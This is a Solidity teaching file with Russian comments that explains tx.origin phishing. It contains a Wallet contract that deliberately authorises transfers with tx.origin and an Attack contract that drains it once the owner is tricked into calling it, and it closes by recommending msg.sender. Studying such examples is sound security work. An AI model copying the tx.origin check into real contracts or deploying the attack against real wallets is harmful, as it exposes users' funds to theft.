/*
Фишинг с помощью tx.origin
В чем разница между msg.sender и tx.origin?
Если контракт A вызывает B, а B вызывает C, в C msg.sender — это B, а tx.origin — это A.

Уязвимость
Вредоносный контракт может заставить владельца контракта вызвать функцию,
которую может вызвать только владелец контракта.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Кошелек — это простой контракт, где только владелец должен иметь возможность перевести
Эфир на другой адрес. Wallet.transfer() использует tx.origin для проверки того, что
звонящий является владельцем. Давайте посмотрим, как мы можем взломать этот контракт
*/

/*
1. Алиса запускает кошелек с 10 эфирами.
2. Ева запускает Атаку с адресом контракта Кошелька Алисы.
3. Ева обманом заставляет Алису вызвать Attack.attack()
4. Ева успешно украла эфир из кошелька Алисы

Что случилось?
Алису обманом заставили вызвать Attack.attack(). Внутри Attack.attack() он
запросил перевод всех средств в кошельке Алисы на адрес Евы.
Поскольку tx.origin в Wallet.transfer() равен адресу Алисы,
он санкционировал передачу. Кошелек перевел весь эфир Еве.
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
/*Профилактические методы
Использовать msg.senderвместоtx.origin*/